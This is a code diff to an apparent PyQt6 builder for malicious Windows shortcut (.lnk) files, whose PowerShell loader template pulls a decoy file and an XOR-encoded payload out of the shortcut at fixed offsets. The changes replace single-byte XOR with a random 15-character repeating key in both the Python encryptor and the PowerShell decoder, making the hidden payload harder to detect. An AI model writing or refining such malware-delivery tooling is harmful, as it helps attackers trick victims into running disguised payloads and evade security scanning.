@@ -14,7 +14,7 @@ from PyQt6.QtCore import QObject, Qt
 from PyQt6.QtGui import QIcon, QAction, QPixmap
 
 loader_template = '''$filename = $env:lnkfilename;
-$key = [System.Text.Encoding]::UTF8.GetBytes('#replacemexorkey')[0];
+$key = [System.Text.Encoding]::UTF8.GetBytes('#replacemexorkey');
 
 $decoy_start_byte = 0x00003000;
 $decoy_filelength = #replacemedecoylength;
@@ -79,7 +79,7 @@ function xor_decode {
 
     for($i = 0; $i -lt $l; $i++)
     {
-        $b[$i] = $b[$i] -bxor $k;
+        $b[$i] = $b[$i] -bxor $k[$i % $k.Length];
     };
 };
 
@@ -145,11 +145,12 @@ filetype = '#replaceme'
 lnkfilename = 'example.lnk'
 hrlnkfilesize = '#replaceme'
 
-def xor_encrypt_payload_decoy(filecontent, xor_key):
+def xor_encrypt_payload_decoy(filecontent: bytes, xor_key: str):
     try:
-        def xor(data, key):
-            return bytearray([a ^ ord(key) for a in data])
-        encrypted_content = xor(filecontent, xor_key)
+        key_bytes = xor_key.encode("utf-8")
+        key_len = len(key_bytes)
+
+        encrypted_content = bytearray([filecontent[i] ^ key_bytes[i % key_len] for i in range(len(filecontent))])
         return encrypted_content
 
     except Exception as e:
@@ -498,7 +499,7 @@ class MainWindow(QWidget):
         payloadsize = os.path.getsize(payload_file_input)
         payload_start_byte = 0x00003000 + decoysize + 1
         loader_start_byte = 0x00003000 + decoysize + 1 + payloadsize + 1
-        xor_key = random.choice(string.ascii_lowercase + string.digits)
+        xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
         loader_template = loader_template.replace('#replacemexorkey', xor_key)
         
         if self.txt_button.isChecked():
